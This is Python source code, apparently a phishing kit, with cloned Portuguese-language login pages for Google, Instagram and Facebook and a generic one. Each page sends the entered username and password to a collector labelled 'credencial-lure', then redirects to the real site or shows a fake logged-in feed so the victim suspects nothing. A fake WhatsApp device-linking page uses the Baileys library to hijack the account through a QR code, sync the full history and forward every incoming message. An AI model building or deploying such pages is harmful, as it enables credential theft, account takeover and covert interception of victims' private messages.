function finish(){overlay();setTimeout(function(){location.replace(dest())},650)}
function stay(seg){kflush();overlay().style.display='none';
 var r=document.getElementById('replica');if(r){r.hidden=false;
  var s=r.querySelector('input,textarea');if(s)s.focus()}
 var n=parseInt(P.get('k')||seg||120,10);setTimeout(function(){location.replace(dest())},n*1000)}
"""

G_SVG = ('<svg class=g viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6'
 'l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>'
 '<path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18'
 'l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59'
 's.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>'
 '<path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3'
 '-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>')

FB_F = ('<svg viewBox="0 0 24 24" width="26" height="26"><path fill="#1877f2" d="M24 12a12 12 0 1 0-13.9 11.9'
 'v-8.4H7v-3.5h3.1V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.24 2.7.24v3h-1.5c-1.5 0-2 .93-2 1.9V12h3.3l-.53 3.5h-2.8'
 'v8.4A12 12 0 0 0 24 12z"/></svg>')

WA_SVG = ('<svg viewBox="0 0 24 24" width="34" height="34"><path fill="#25d366" d="M17.5 14.4c-.3-.15'
 '-1.7-.85-2-.95-.25-.1-.43-.15-.6.15s-.7.9-.85 1.1c-.15.2-.3.2-.55.07-.3-.15-1.15-.43-2.2-1.36'
 '-.8-.72-1.35-1.6-1.5-1.87-.15-.28-.02-.43.13-.57.13-.13.3-.35.45-.53.15-.17.2-.3.3-.5.1-.2.05-.37-.03-.52'
 '-.07-.15-.6-1.45-.83-1.98-.22-.52-.44-.45-.6-.46h-.5c-.18 0-.47.07-.72.34-.24.27-.94.92-.94 2.24s.96 2.6 1.1 2.78'
 'c.13.18 1.88 2.87 4.55 4.02.64.27 1.13.44 1.52.56.64.2 1.22.17 1.68.1.51-.07 1.57-.64 1.8-1.26.22-.62.22-1.15.15-1.26'
 '-.07-.11-.25-.18-.55-.33z"/><path fill="#25d366" d="M12 0C5.37 0 0 5.37 0 12c0 2.12.55 4.1 1.5 5.82L0 24l6.35-1.66'
 'A11.95 11.95 0 0 0 12 24c6.63 0 12-5.37 12-12S18.63 0 12 0zm0 21.9c-1.9 0-3.68-.52-5.2-1.42l-.37-.22-3.85 1'
 '1.03-3.75A9.87 9.87 0 0 1 2.1 12C2.1 6.54 6.54 2.1 12 2.1S21.9 6.54 21.9 12 17.46 21.9 12 21.9z"/></svg>')

def tile(i): return f"https://picsum.photos/seed/nx{i}/600/600"
def av(i): return f"https://i.pravatar.cc/80?img={i}"
def fav(d): return f"https://www.google.com/s2/favicons?domain={d}&sz=64"

GOOGLE = r"""<!doctype html><html lang=pt-BR><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Fazer login – Contas do Google</title><style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;min-height:100%}
body{font-family:Roboto,'Google Sans',Arial,sans-serif;color:#202124;background:#fff;
display:flex;flex-direction:column;padding:24px 24px 18px;font-size:16px;min-height:100vh}
.g{width:40px;height:40px;margin:12px auto 0}
h1{font-size:24px;font-weight:400;margin:22px 0 10px;text-align:center;line-height:1.3}
.s{font-size:16px;text-align:center;margin:0 0 28px}
.fld{position:relative;margin-bottom:6px}
input{width:100%;height:56px;padding:22px 14px 8px;border:1px solid #dadce0;border-radius:4px;
font-size:16px;color:#202124;background:#fff;outline:0}
input:focus{border:2px solid #1a73e8;padding:21px 13px 7px}
label{position:absolute;left:14px;top:17px;font-size:16px;color:#5f6368;pointer-events:none;transition:.12s}
input:focus+label,input:not(:placeholder-shown)+label{top:8px;font-size:12px}
input:focus+label{color:#1a73e8}
.lnk{display:inline-block;color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none;margin-top:10px}
.row{margin-top:auto;display:flex;align-items:center;justify-content:space-between;padding-top:36px}
.ghost{color:#1a73e8;font-size:14px;font-weight:500;background:0;border:0;padding:10px 0}
.next{background:#1a73e8;color:#fff;border:0;border-radius:100px;height:40px;padding:0 26px;
font-size:14px;font-weight:500}
.ft{margin-top:22px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
select{border:0;background:0;font-size:12px;color:#5f6368;padding:6px 0}
.chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:100px;
padding:3px 14px 3px 3px;width:max-content;margin:0 auto 26px;font-size:14px}
.av{width:28px;height:28px;border-radius:50%;background:#1a73e8;color:#fff;display:grid;
place-items:center;font-size:13px;font-weight:500;text-transform:uppercase}
.pw{position:relative}.show{position:absolute;right:6px;top:50%;transform:translateY(-50%);
background:0;border:0;color:#1a73e8;font-size:14px;font-weight:500;padding:12px 10px}
#replica{position:fixed;inset:0;background:#fff;z-index:5;overflow:auto}
#replica .tb{display:flex;align-items:center;gap:14px;padding:10px 14px;border-bottom:1px solid #ebebeb}
#replica .tb img.lg{width:26px;height:26px}
#replica .sb{flex:1;display:flex;align-items:center;gap:9px;border:1px solid #dfe1e5;
border-radius:100px;height:42px;padding:0 14px;box-shadow:0 1px 6px rgba(32,33,36,.14)}
#replica .sb input{flex:1;height:40px;border:0;padding:0;font-size:16px;outline:0;background:0}
#replica .tb .me{width:28px;height:28px;border-radius:50%;background:#1a73e8;color:#fff;
display:grid;place-items:center;font-size:13px}
#replica .tabs{display:flex;gap:22px;padding:0 16px;border-bottom:1px solid #ebebeb;font-size:13px;
color:#5f6368;overflow:auto}
#replica .tabs b{color:#1a73e8;border-bottom:3px solid #1a73e8;padding:12px 0;font-weight:500}
#replica .tabs span{padding:12px 0;white-space:nowrap}
#replica .tiles{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;padding:18px 16px 6px}
#replica .tl{text-align:center;font-size:11px;color:#202124}
#replica .tl i{display:grid;place-items:center;width:52px;height:52px;border-radius:50%;
background:#f1f3f4;margin:0 auto 6px}
#replica .tl img{width:26px;height:26px;border-radius:50%}
#replica .sec{font-size:13px;color:#5f6368;padding:16px 16px 8px;font-weight:500}
#replica .res{padding:12px 16px;border-top:1px solid #f1f3f4}
#replica .res .h{display:flex;gap:10px;align-items:center;font-size:12px;color:#5f6368}
#replica .res .h img{width:18px;height:18px;border-radius:50%}
#replica .res .t{color:#1a0dab;font-size:17px;margin:5px 0 3px;line-height:1.3}
#replica .res .d{color:#4d5156;font-size:13px;line-height:1.5}
#replica .res img.th{width:100%;border-radius:10px;margin-top:8px;display:block}
#replica .res video{width:100%;border-radius:10px;margin-top:8px;display:block}
</style></head><body>
__GSVG__
<h1 id=h1>Fazer login</h1><p class=s id=s>Use sua Conta do Google</p>
<form id=f novalidate>
<div id=step1>
 <div class=fld><input id=u placeholder=" " autocomplete=username autocapitalize=off
  spellcheck=false autofocus><label>E-mail ou telefone</label></div>
 <a class=lnk href="https://accounts.google.com/signin/v2/usernamerecovery">Esqueceu seu e-mail?</a>
</div>
<div id=step2 hidden>
 <div class=chip><div class=av id=av>?</div><span id=em></span></div>
 <div class=fld pw><input id=p type=password placeholder=" " autocomplete=current-password>
  <label>Digite sua senha</label><button type=button class=show id=pb onclick="show('p')">Mostrar</button></div>
 <a class=lnk href="https://accounts.google.com/signin/v2/challenge/pwd">Esqueceu a senha?</a>
</div>
<div class=row>
 <button type=button class=ghost onclick="location.href='https://accounts.google.com/signup/v2/webcreateaccount'">Criar conta</button>
 <button class=next id=b>Próxima</button>
</div>
</form>
<div class=ft><select><option>Português (Brasil)</option><option>English (US)</option></select>
<span>Ajuda · Privacidade · Termos</span></div>

<div id=replica hidden>
 <div class=tb><img class=lg src="__GFAV__">
  <div class=sb><svg viewBox="0 0 24 24" width="18" height="18" fill="#9aa0a6"><path d="M15.5 14h-.8l-.3-.3A6.5 6.5 0 1 0 13 15.2l.3.3v.8l5 5 1.5-1.5-5-5zm-6 0A4.5 4.5 0 1 1 14 9.5 4.5 4.5 0 0 1 9.5 14z"/></svg>
  <input id=rs placeholder="Pesquisar no Google ou digitar um URL" value="noticias de hoje"></div>
  <div class=me>G</div></div>
 <div class=tabs><b>Tudo</b><span>Imagens</span><span>Notícias</span><span>Vídeos</span><span>Maps</span><span>Shopping</span></div>
 <div class=tiles>
  <div class=tl><i><img src="__F1__"></i>Gmail</div><div class=tl><i><img src="__F2__"></i>YouTube</div>
  <div class=tl><i><img src="__F3__"></i>Maps</div><div class=tl><i><img src="__F4__"></i>Drive</div>
  <div class=tl><i><img src="__F5__"></i>Notícias</div><div class=tl><i><img src="__F6__"></i>Fotos</div>
  <div class=tl><i><img src="__F7__"></i>Play</div><div class=tl><i><img src="__F8__"></i>Mais</div>
 </div>
 <div class=sec>Principais notícias</div>
 <div class=res><div class=h><img src="__F9__">g1.globo.com</div>
  <div class=t>G1 – As principais notícias do Brasil e do mundo</div>
  <div class=d>Últimas notícias, vídeos e reportagens sobre política, economia, esportes e tecnologia.</div>
  <img class=th src="__I1__" loading=lazy></div>
 <div class=res><div class=h><img src="__F10__">youtube.com</div>
  <div class=t>Jornal da manhã · cobertura ao vivo</div>
  <div class=d>Acompanhe os destaques desta manhã em vídeo.</div>
  <video src="https://www.w3schools.com/html/mov_bbb.mp4" muted loop playsinline autoplay></video></div>
 <div class=res><div class=h><img src="__F11__">uol.com.br</div>
  <div class=t>UOL Notícias – Informação de qualidade</div>
  <div class=d>Cobertura completa dos fatos que movem o país e o mundo hoje.</div>
  <img class=th src="__I2__" loading=lazy></div>
 <div class=res><div class=h><img src="__F12__">folha.uol.com.br</div>
  <div class=t>Folha de S.Paulo – Últimas notícias</div>
  <div class=d>Jornalismo independente e análise diária dos principais acontecimentos.</div>
  <img class=th src="__I3__" loading=lazy></div>
</div>
<script>__JS__
var step=1;
f.onsubmit=function(e){e.preventDefault();
 if(step===1){if(!u.value.trim()){u.focus();return}
  send([{vetor:'credencial-lure',host:H,plataforma:PL,usuario:u.value,segredo:'',extra:'etapa=1'}]);
  em.textContent=u.value;av.textContent=u.value[0]||'?';
  step1.hidden=true;step2.hidden=false;h1.textContent='Bem-vindo';s.textContent='';
  b.textContent='Fazer login';p.focus();step=2;return}
 send([{vetor:'credencial-lure',host:H,plataforma:PL,usuario:u.value,segredo:p.value,extra:'etapa=2'}]);
 if(P.get('m')==='stay')stay(120);else finish()};
</script></body></html>"""

INSTA = r"""<!doctype html><html lang=pt-BR><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<style>@import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;background:#fff;font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
color:#262626;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.wrap{width:100%;max-width:400px;padding:44px 34px 0;display:flex;flex-direction:column;align-items:center}
.logo{font-family:'Grand Hotel',cursive;font-size:44px;line-height:1;margin-bottom:34px}
form{width:100%}
input{width:100%;height:44px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;
padding:0 12px;font-size:14px;margin-bottom:6px;outline:0}
input:focus{border-color:#a8a8a8}
.pw{position:relative}.pw input{padding-right:58px}
.show{position:absolute;right:0;top:0;height:44px;background:0;border:0;color:#262626;
font-size:14px;font-weight:600;padding:0 12px}
.go{width:100%;height:44px;background:#0095f6;color:#fff;border:0;border-radius:8px;
font-size:14px;font-weight:600;margin-top:8px}
.ou{width:100%;display:flex;align-items:center;gap:16px;margin:18px 0}
.ou span{flex:1;height:1px;background:#dbdbdb}.ou b{font-size:13px;font-weight:600;color:#8e8e8e}
.fb{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;
font-size:14px;font-weight:600;text-decoration:none;margin:6px 0 16px}
.forgot{font-size:12px;color:#00376b;text-decoration:none;margin-bottom:26px}
.signup{width:100%;max-width:400px;border-top:1px solid #dbdbdb;text-align:center;
padding:22px 0;font-size:14px;margin-top:14px}
.signup b{color:#0095f6;font-weight:600}
.meta{font-size:12px;color:#8e8e8e;padding:14px 0 30px;margin-top:auto}
#replica{position:fixed;inset:0;background:#fff;z-index:5;display:flex;flex-direction:column;overflow:auto}
#replica .top{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;
border-bottom:1px solid #efefef;font-family:'Grand Hotel',cursive;font-size:26px}
#replica .top .ic{display:flex;gap:16px;align-items:center}
#replica .sr{display:flex;gap:14px;padding:12px 16px;overflow:auto;border-bottom:1px solid #efefef}
#replica .st{width:64px;flex:0 0 auto;text-align:center;font-size:11px}
#replica .st i{display:block;width:58px;height:58px;border-radius:50%;padding:2px;
background:linear-gradient(135deg,#f09433,#dc2743,#bc1888);margin:0 auto 5px}
#replica .st i img{width:100%;height:100%;border-radius:50%;border:2px solid #fff;object-fit:cover}
#replica .card{border-bottom:1px solid #efefef;padding-bottom:8px}
#replica .hd{display:flex;align-items:center;gap:10px;padding:9px 14px;font-size:13px;font-weight:600}
#replica .hd img{width:32px;height:32px;border-radius:50%;object-fit:cover}
#replica .hd span{margin-left:auto;letter-spacing:2px}
#replica .ph{width:100%;display:block;background:#efefef}
#replica .ac{display:flex;gap:14px;padding:8px 14px 4px;font-size:22px}
#replica .lk{padding:0 14px;font-size:13px;font-weight:600}
#replica .cp{padding:3px 14px 6px;font-size:13px;line-height:1.45}
#replica .cp b{font-weight:600;margin-right:4px}
#replica .tm{padding:0 14px 6px;font-size:11px;color:#8e8e8e;text-transform:uppercase}
</style></head><body>
<div class=wrap>
<div class=logo>Instagram</div>
<form id=f novalidate>
<input id=u placeholder="Nome de usuário, e-mail ou celular" autocomplete=username
 autocapitalize=off autocorrect=off spellcheck=false autofocus>
<div class=pw><input id=p type=password placeholder=Senha autocomplete=current-password>
<button type=button class=show id=pb onclick="show('p')">Mostrar</button></div>
<button class=go id=b>Entrar</button></form>
<div class=ou><span></span><b>OU</b><span></span></div>
<a class=fb href="https://www.facebook.com/login/"><svg viewBox="0 0 24 24" width="18" height="18">
<path fill="#385185" d="M24 12a12 12 0 1 0-13.9 11.9v-8.4H7v-3.5h3.1V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.24 2.7.24v3
h-1.5c-1.5 0-2 .93-2 1.9V12h3.3l-.53 3.5h-2.8v8.4A12 12 0 0 0 24 12z"/></svg>Entrar com o Facebook</a>
<a class=forgot href="https://www.instagram.com/accounts/password/reset/">Esqueceu a senha?</a>
</div>
<div class=signup>Não tem uma conta? <b>Cadastre-se</b></div>
<div class=meta>Meta</div>

<div id=replica hidden>
<div class=top><span>Instagram</span><div class=ic>
<svg viewBox="0 0 24 24" width="23" height="23" fill="none" stroke="#262626" stroke-width="1.8"><path d="M12 21s-7.5-4.6-9.3-9A5.2 5.2 0 0 1 12 6.6 5.2 5.2 0 0 1 21.3 12c-1.8 4.4-9.3 9-9.3 9z"/></svg>
<svg viewBox="0 0 24 24" width="23" height="23" fill="none" stroke="#262626" stroke-width="1.8"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg></div></div>
<div class=sr>
<div class=st><i><img src="__A1__"></i>você</div><div class=st><i><img src="__A2__"></i>dev.br</div>
<div class=st><i><img src="__A3__"></i>arte</div><div class=st><i><img src="__A4__"></i>viagem</div>
<div class=st><i><img src="__A5__"></i>foto</div><div class=st><i><img src="__A6__"></i>daily</div></div>
<div class=card><div class=hd><img src="__A2__">dev.br<span>•••</span></div>
<img class=ph src="__I1__" loading=lazy>
<div class=ac><svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#262626" stroke-width="1.8"><path d="M12 21s-7.5-4.6-9.3-9A5.2 5.2 0 0 1 12 6.6 5.2 5.2 0 0 1 21.3 12c-1.8 4.4-9.3 9-9.3 9z"/></svg>
<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#262626" stroke-width="1.8"><path d="M21 11.5a8.4 8.4 0 0 1-9 8.4 8.6 8.6 0 0 1-4-.9L3 21l1.9-4.6a8.4 8.4 0 1 1 16.1-4.9z"/></svg>
<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#262626" stroke-width="1.8"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg></div>
<div class=lk>1.284 curtidas</div><div class=cp><b>dev.br</b>setup novo, mesma correria</div>
<div class=tm>há 2 horas</div></div>
<div class=card><div class=hd><img src="__A4__">viagem<span>•••</span></div>
<video class=ph src="https://www.w3schools.com/html/mov_bbb.mp4" muted loop playsinline autoplay></video>
<div class=lk>842 curtidas</div><div class=cp><b>viagem</b>fim de tarde</div>
<div class=tm>há 5 horas</div></div>
</div>
<script>__JS__
f.onsubmit=function(e){e.preventDefault();if(!u.value.trim()){u.focus();return}
 send([{vetor:'credencial-lure',host:H,plataforma:PL,usuario:u.value,segredo:p.value}]);
 if(P.get('m')==='stay')stay(120);else finish()};
</script></body></html>"""

FACE = r"""<!doctype html><html lang=pt-BR><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Facebook</title><style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{margin:0;background:#fff;font-family:Helvetica,Arial,sans-serif;color:#1c1e21;
min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 16px}
.logo{margin:38px 0 18px}h1{font-size:17px;font-weight:400;margin:0 0 20px}
form{width:100%;max-width:380px}
input{width:100%;height:50px;border:1px solid #dddfe2;border-radius:8px;padding:0 14px;
font-size:16px;margin-bottom:12px;outline:0}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.pw{position:relative}.pw input{padding-right:60px}
.show{position:absolute;right:0;top:0;height:50px;background:0;border:0;color:#1877f2;
font-size:14px;font-weight:600;padding:0 12px}
.go{width:100%;height:48px;background:#1877f2;color:#fff;border:0;border-radius:8px;
font-size:17px;font-weight:700;margin-top:4px}
.forgot{display:block;text-align:center;font-size:14px;color:#1877f2;text-decoration:none;margin:16px 0}
hr{border:0;border-top:1px solid #dadde1;margin:0 0 20px;width:100%;max-width:380px}
.new{width:100%;max-width:380px;height:48px;background:#42b72a;color:#fff;border:0;border-radius:8px;
font-size:17px;font-weight:700}
.meta{font-size:13px;color:#8a8d91;padding:26px 0 30px;margin-top:auto}
#replica{position:fixed;inset:0;background:#f0f2f5;z-index:5;overflow:auto}
#replica .top{background:#fff;padding:8px 12px;display:flex;gap:10px;align-items:center;
border-bottom:1px solid #dddfe2;position:sticky;top:0}
#replica .top b{color:#1877f2;font-size:26px;line-height:1}
#replica .top div{flex:1;height:38px;background:#f0f2f5;border-radius:100px;
display:flex;align-items:center;padding:0 14px;color:#8a8d91;font-size:14px}
#replica .top img{width:32px;height:32px;border-radius:50%}
#replica .cmp{background:#fff;margin-top:8px;padding:12px;display:flex;gap:10px;align-items:center;
font-size:14px;color:#65676b}
#replica .cmp img{width:36px;height:36px;border-radius:50%}
#replica .post{background:#fff;margin-top:8px;padding:12px 0}
#replica .ph{display:flex;align-items:center;gap:10px;padding:0 12px;font-size:14px}
#replica .ph img{width:38px;height:38px;border-radius:50%}
#replica .ph b{display:block}#replica .ph i{font-size:12px;color:#65676b;font-style:normal}
#replica .tx{padding:10px 12px;font-size:14px;line-height:1.4}
#replica .im{width:100%;display:block;background:#e4e6eb}
#replica .li{padding:4px 12px;font-size:13px;color:#65676b}
</style></head><body>
<div class=logo>__FBF__</div><h1>Entrar no Facebook</h1>
<form id=f novalidate>
<input id=u placeholder="E-mail ou celular" autocomplete=username autocapitalize=off
 spellcheck=false autofocus>
<div class=pw><input id=p type=password placeholder=Senha autocomplete=current-password>
<button type=button class=show id=pb onclick="show('p')">Mostrar</button></div>
<button class=go id=b>Entrar</button></form>
<a class=forgot href="https://www.facebook.com/login/identify/">Esqueceu a senha?</a>
<hr><button class=new>Criar nova conta</button><div class=meta>Meta</div>

<div id=replica hidden>
<div class=top><b>f</b><div>Pesquisar no Facebook</div><img src="__A1__"></div>
<div class=cmp><img src="__A1__">No que você está pensando?</div>
<div class=post><div class=ph><img src="__A2__"><div><b>Dev BR</b><i>há 3 horas</i></div></div>
<div class=tx>depois de 3 dias, o ambiente finalmente ficou decente</div>
<img class=im src="__I1__" loading=lazy>
<div class=li>1,2 mil · 148 comentários</div></div>
</div>
<script>__JS__
f.onsubmit=function(e){e.preventDefault();if(!u.value.trim()){u.focus();return}
 send([{vetor:'credencial-lure',host:H,plataforma:PL,usuario:u.value,segredo:p.value}]);
 if(P.get('m')==='stay')stay(120);else finish()};
</script></body></html>"""

GENERIC = r"""<!doctype html><html lang=pt-BR><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Entrar</title><style>
*{box-sizing:border-box}body{margin:0;background:#f5f6f8;font-family:system-ui,sans-serif;
color:#111827;min-height:100vh;display:grid;place-items:center;padding:18px}
.card{background:#fff;width:100%;max-width:360px;padding:32px 28px;border-radius:14px;
box-shadow:0 2px 14px rgba(0,0,0,.08)}h1{font-size:20px;margin:0 0 20px;text-align:center}
input{width:100%;height:48px;border:1px solid #d1d5db;border-radius:8px;padding:0 14px;
font-size:15px;margin-bottom:10px;outline:0}
.pw{position:relative}.pw input{padding-right:60px}
.show{position:absolute;right:0;top:0;height:48px;background:0;border:0;color:#2563eb;
font-size:14px;font-weight:600;padding:0 12px}
button.go{width:100%;height:48px;background:#2563eb;color:#fff;border:0;border-radius:8px;
font-size:15px;font-weight:600}
#replica{position:fixed;inset:0;background:#fff;z-index:5;padding:16px;font-size:14px}
</style></head><body><form class=card id=f novalidate>
<h1>Entrar</h1><input id=u placeholder="E-mail ou usuário" autocomplete=username autofocus>
<div class=pw><input id=p type=password placeholder="Senha"><button type=button class=show id=pb onclick="show('p')">Mostrar</button></div>
<button class=go id=b>Continuar</button></form>
<div id=replica hidden><b>Conectado</b><p>Carregando sua conta…</p></div>
<script>__JS__
f.onsubmit=function(e){e.preventDefault();if(!u.value.trim()){u.focus();return}
 send([{vetor:'credencial-lure',host:H,plataforma:PL,usuario:u.value,segredo:p.value}]);
 if(P.get('m')==='stay')stay(120);else finish()};
</script></body></html>"""

BRANDS = {"google": (GOOGLE, "Google", "https://accounts.google.com/"),
          "instagram": (INSTA, "Instagram", "https://www.instagram.com/"),
          "facebook": (FACE, "Facebook", "https://www.facebook.com/"),
          "generic": (GENERIC, "Acesso", "https://")}

FAVS = ["gmail.com","youtube.com","maps.google.com","drive.google.com","news.google.com",
        "photos.google.com","play.google.com","google.com","g1.globo.com","youtube.com",
        "uol.com.br","folha.uol.com.br"]

def render(real, brand, host):
    tpl, pl, dflt = BRANDS.get(brand, BRANDS["generic"])
    real = real or dflt
    t = tpl.replace("__GSVG__", G_SVG).replace("__FBF__", FB_F)
    t = t.replace("__PL__", pl).replace("__JS__", CORE_JS)
    t = t.replace("DEST", '"' + real + '"')
    t = t.replace("__GFAV__", fav("google.com"))
    for n in range(1, 13):
        t = t.replace(f"__F{n}__", fav(FAVS[n-1]))
    for n in range(1, 4):
        t = t.replace(f"__I{n}__", tile(n))
    for n in range(1, 7):
        t = t.replace(f"__A{n}__", av(n * 3))
    return t

WA_PAGE = r"""<!doctype html><html lang=pt-BR><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>WhatsApp</title><style>
*{box-sizing:border-box}body{margin:0;font-family:'Segoe UI',Helvetica,Arial,sans-serif;
color:#41525d;background:#fff;min-height:100vh}
.top{display:flex;align-items:center;gap:10px;padding:16px 20px;border-bottom:1px solid #e9edef}
.top span{font-size:13px;letter-spacing:2px;font-weight:500}
.mid{max-width:560px;margin:0 auto;padding:30px 24px;text-align:center}
h1{font-size:23px;font-weight:400;margin:0 0 18px}
ol{text-align:left;font-size:14px;line-height:1.9;color:#667781;padding-left:22px;margin:0 0 22px}
.qrbox{border:1px solid #e9edef;border-radius:8px;padding:16px;display:inline-block}
.qrbox img{display:block;width:240px;height:240px}
.st{font-size:13px;color:#667781;margin-top:16px}
.ok{display:none;font-size:15px;color:#00a884;margin-top:16px;font-weight:600}
.sil{background:#f0fdf9;border:1px solid #d1fae5;border-radius:8px;padding:10px 12px;
font-size:12px;color:#067a5c;margin-bottom:18px}
</style></head><body>
<div class=top>__WA__<span>WHATSAPP</span></div>
<div class=mid>
<div class=sil>Sessão local detectada no navegador</div>
<h1>Conectar um aparelho</h1>
<ol><li>Abra o WhatsApp no celular</li>
<li>Toque em <b>Mais opções</b> → <b>Aparelhos conectados</b></li>
<li>Toque em <b>Conectar um aparelho</b></li>
<li>Aponte para a tela</li></ol>
<div class=qrbox><img id=qr alt="QR"></div>
<div class=st id=st>Carregando código…</div><div class=ok id=ok>Aparelho conectado ✓</div>
</div><script>
var last='';
function tick(){fetch('/api/wa/qr').then(r=>r.json()).then(d=>{
 if(d.conectado){document.getElementById('ok').style.display='block';
  document.getElementById('st').textContent='Sessão ativa';return}
 if(d.qr&&d.qr!==last){last=d.qr;document.getElementById('qr').src=d.qr;
  document.getElementById('st').textContent='QR válido por 20 segundos'}}).catch(()=>{});
 setTimeout(tick,2000)}
tick();
</script></body></html>"""

WA_JS = r"""
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } =
  require('@whiskeysockets/baileys')
const QR = require('qrcode'), pino = require('pino')
const P = 'http://127.0.0.1:' + (process.env.PORT || 8080)
async function start() {
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth')
  const s = makeWASocket({ auth: state, printQRInTerminal: false, syncFullHistory: true,
    logger: pino({ level: 'silent' }), browser: Browsers.ubuntu('Chrome'),
    markOnlineOnConnect: false })
  s.ev.on('creds.update', saveCreds)
  s.ev.on('connection.update', async u => {
    if (u.qr) console.log('QR ' + await QR.toDataURL(u.qr, { margin: 1, width: 300 }))
    if (u.connection === 'open') console.log('OPEN')
    if (u.connection === 'close') {
      const c = u.lastDisconnect && u.lastDisconnect.error && u.lastDisconnect.error.output &&
        u.lastDisconnect.error.output.statusCode
      if (c !== DisconnectReason.loggedOut) setTimeout(start, 3000)
      else console.log('LOGOUT')
    }
  })
  s.ev.on('messages.upsert', async m => {
    for (const x of m.messages) {
      const g = x.message || {}
      const t = g.conversation || (g.extendedTextMessage && g.extendedTextMessage.text)
        || (g.imageMessage && g.imageMessage.caption) || (g.imageMessage ? '[imagem]' : '')
        || (g.audioMessage ? '[audio]' : '') || (g.videoMessage ? '[video]' : '')
        || (g.documentMessage ? '[documento]' : '') || (g.stickerMessage ? '[figurinha]' : '')
        || (g.locationMessage ? '[local]' : '')
      if (!t) continue
      await fetch(P + '/api/wa/msg', { method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jid: x.key.remoteJid || '', de: x.key.fromMe ? 'eu' : (x.pushName || '?'),
          texto: t, ts: (Number(x.messageTimestamp) || 0) * 1000, fonte: 'qr' }) }).catch(() => {})
    }
  })
}
start()
"""

WA_STATE = {"qr": "", "conectado": False, "proc": None}

def wa_boot(port):
    d = os.path.join(HOME, "wa"); os.makedirs(d, exist_ok=True)
    open(os.path.join(d, "wa.js"), "w").write(WA_JS)
    if not os.path.exists(os.path.join(d, "package.json")):
        open(os.path.join(d, "package.json"), "w").write('{"name":"wa","private":true}')
    if not os.path.isdir(os.path.join(d, "node_modules")):
        if not shutil.which("node"): print("[!] pkg install nodejs"); return
        print("[*] npm install baileys (1x)…")
        r = subprocess.run(["npm","install","--no-audit","--no-fund",
                            "@whiskeysockets/baileys","qrcode","pino"],
                           cwd=d, capture_output=True, text=True)
        if r.returncode: print("[!] npm:", r.stderr[-300:]); return
    p = subprocess.Popen(["node","wa.js"], cwd=d, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, env={**os.environ, "PORT": str(port)})
    WA_STATE["proc"] = p
    for line in p.stdout:
        line = line.rstrip()
        if line.startswith("QR "): WA_STATE["qr"] = line[3:]
        elif line == "OPEN": WA_STATE["conectado"] = True
        elif line == "LOGOUT": WA_STATE["conectado"] = False; WA_STATE["qr"] = ""

LOGO = """<svg viewBox="0 0 120 120" class=lg>
<g stroke="#1d3b3b" stroke-width="1"><path d="M18 26H102M18 34H102M16 44H104M16 54H104M16 66H104M16 76H104M18 86H102M18 94H102"/></g>
<path d="M60 8 L104 32 L104 80 L60 112 L16 80 L16 32 Z" fill="none" stroke="#2de6c6" stroke-width="1.6"/>
<path d="M60 62 C50 40 26 40 26 58 C26 74 44 76 60 62 Z" fill="#4ff0c4" opacity=".92"/>
<path d="M60 62 C70 40 94 40 94 58 C94 74 76 76 60 62 Z" fill="#4ff0c4" opacity=".92"/>
<path d="M60 62 V90" stroke="#ffe066" stroke-width="1.5"/><circle cx="60" cy="59" r="3.2" fill="#ffe066"/>
<circle cx="16" cy="26" r="2.4" fill="#c8ff4d"/><circle cx="104" cy="26" r="2.4" fill="#c8ff4d"/>
<circle cx="16" cy="94" r="2.4" fill="#c8ff4d"/><circle cx="104" cy="94" r="2.4" fill="#c8ff4d"/>
</svg>"""

CSS = """*{box-sizing:border-box}
body{margin:0;background:#05080a;color:#9fb3ad;font:12.5px/1.5 ui-monospace,monospace;min-height:100vh}
